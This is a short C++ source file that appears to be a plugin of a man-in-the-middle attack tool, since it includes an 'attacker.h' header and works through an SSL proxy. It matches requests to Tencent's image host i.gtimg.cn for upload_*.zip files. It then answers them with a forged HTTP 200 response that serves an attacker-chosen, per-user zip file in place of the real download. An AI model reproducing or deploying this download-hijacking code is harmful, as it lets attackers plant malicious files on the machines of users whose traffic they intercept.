#include "gtimg.h"
#include "PluginServer.h"
#include "../attacker.h"


int QQigtimg::isQQigtimg(string url, string host) {
	if (host == "i.gtimg.cn")
	{
		if (strstr(url.c_str(), "/channel/imglib/") && strstr(url.c_str(), "/upload_") && strstr(url.c_str(), ".zip") )
		{
			//if (strstr(url.c_str(),"762720c247a6b753a07e29feb08e01f0.zip") )
			{
				return TRUE;
			}
		}
	}

	return FALSE;
}

int QQigtimg::replyQQigtimg(char*recvBuffer,int len, int buflimit,LPSSLPROXYPARAM pstSSLProxyParam) {
	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(pstSSLProxyParam->username, QQGTIMG_ZIP_FILENAME);
	int ret = PluginServer::SendPluginFile(filename.c_str(),pstSSLProxyParam, szHttpRespFormat,1);
	return ret;
}